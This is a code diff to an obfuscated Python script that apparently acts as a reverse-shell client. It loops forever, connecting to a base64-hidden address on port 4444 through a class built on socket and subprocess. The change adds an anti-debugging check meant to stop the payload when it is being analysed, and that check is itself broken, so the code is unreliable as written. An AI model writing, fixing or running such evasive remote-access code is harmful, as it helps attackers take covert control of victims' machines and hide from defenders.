@@ -1,5 +1,6 @@
 
 import subprocess as su
+import sys
 import os as o
 import socket as s
 import time as ti
@@ -182,9 +183,15 @@ class X:
                 except s.timeout: 
                     continue
 
+def dbg():
+    return sys.gettrace is not None
+
 while True:
     try:
-        myX = X(bs.b64decode("MTY5LjI1NC4wLjE=").decode(), int(bs.b64decode("NDQ0NA==").decode()))
-        myX.rrr()
+        if dbg(): 
+            exit
+        else: 
+            myX = X(bs.b64decode("MTY5LjI1NC4wLjE=").decode(), int(bs.b64decode("NDQ0NA==").decode()))
+            myX.rrr()
     except:
         continue
